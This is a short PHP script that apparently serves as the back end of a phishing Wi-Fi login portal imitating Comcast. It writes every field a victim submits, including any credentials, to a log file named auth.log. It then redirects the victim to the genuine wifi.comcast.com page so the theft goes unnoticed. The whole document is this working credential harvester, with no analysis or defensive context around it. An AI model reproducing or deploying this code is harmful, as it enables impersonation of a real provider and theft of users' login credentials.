<?php
// the name of the file you're writing to
$myFile = "../auth.log";

// opens the file for appending (file must already exist)
$fh = fopen($myFile, 'a');

// Makes a CSV list of your post data
$comma_delimited_list = implode(", ", $_POST) . "\n";
$post = "----------------------------------------\n\n";

// Write to the file
fwrite($fh, $comma_delimited_list);
fwrite($fh, $post);

// Close the file
fclose($fh);

// Redirect to the real wifi.comcast.com landing page
header('Location: http://wifi.comcast.com' );
?>